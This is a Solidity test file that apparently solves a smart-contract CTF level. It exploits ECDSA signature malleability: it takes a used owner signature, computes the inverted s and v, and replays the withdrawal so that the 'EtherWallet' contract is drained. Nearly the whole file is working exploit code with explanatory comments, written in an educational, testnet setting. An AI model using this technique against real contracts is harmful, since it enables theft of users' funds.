function testCompleteLevel() public {
    address player = users[0];
    vm.startPrank(player);

    uint256 playerBalanceBefore = player.balance;
    uint256 walletBalanceBefore = address(level).balance;

    // Let's look at the `withdraw` transaction to gather the signature used by the owner of the contract
    // https://goerli.etherscan.io/tx/0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548
    bytes
        memory signature = hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";

    // If we try to withdraw using the same signature the contract should revert
    vm.expectRevert(bytes("Signature already used!"));
    level.withdraw(signature);

    // Now we need to exploit the malleable signature exploit present in the custom ECDSA
    // Implementation inside the EtherWallet contract
    // Let's split the current signature to get back the tuple (uint8 v, bytes32 r, bytes32 s)
    (uint8 v, bytes32 r, bytes32 s) = deconstructSignature(signature);

    // Now we can calculate what should be the "inverted signature"
    bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
    uint8 invertedV = v == 27 ? 28 : 27;

    // After calculating which is the inverse `s` and `v` we just need to re-create the signature
    bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

    // And use it to trigger again the withdraw
    // If everything works as expected we should have drained the contract from the 0.2 ETH in its balance
    level.withdraw(invertedSignature);

    vm.stopPrank();

    // Assert we were able to withdraw all the ETH
    assertEq(player.balance, playerBalanceBefore + walletBalanceBefore);
    assertEq(address(level).balance, 0 ether);
}

// utility function to deconstruct a signature returning (v, r, s)
function deconstructSignature(bytes memory signature)
    public
    pure
    returns (
        uint8,
        bytes32,
        bytes32
    )
{
    bytes32 r;
    bytes32 s;
    uint8 v;
    // ecrecover takes the signature parameters, and the only way to get them
    // currently is to use assembly.
    /// @solidity memory-safe-assembly
    assembly {
        r := mload(add(signature, 0x20))
        s := mload(add(signature, 0x40))
        v := byte(0, mload(add(signature, 0x60)))
    }
    return (v, r, s);
}